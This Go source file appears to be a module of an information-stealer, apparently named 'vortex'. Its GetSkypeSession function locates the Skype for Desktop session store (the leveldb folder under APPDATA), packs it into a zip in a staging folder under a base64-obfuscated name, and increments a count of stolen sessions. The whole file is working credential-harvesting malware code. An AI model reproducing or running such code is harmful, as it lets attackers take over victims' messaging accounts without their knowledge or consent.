package messenger

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func GetSkypeSession(mainFolder string) error {

	skypeSession := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Skype for Desktop\\Local Storage\\leveldb")
	if _, err := os.Stat(skypeSession); os.IsNotExist(err) {
		return nil
	}

	if err := hutil.ZipFolder("Skype for Desktop", skypeSession, filepath.Join(mainFolder, encrypt.B64Util("messenger-skype-session.zip", 0)), "LOCK"); err != nil {
		return err
	}

	hutil.Sessions++

	return nil
}
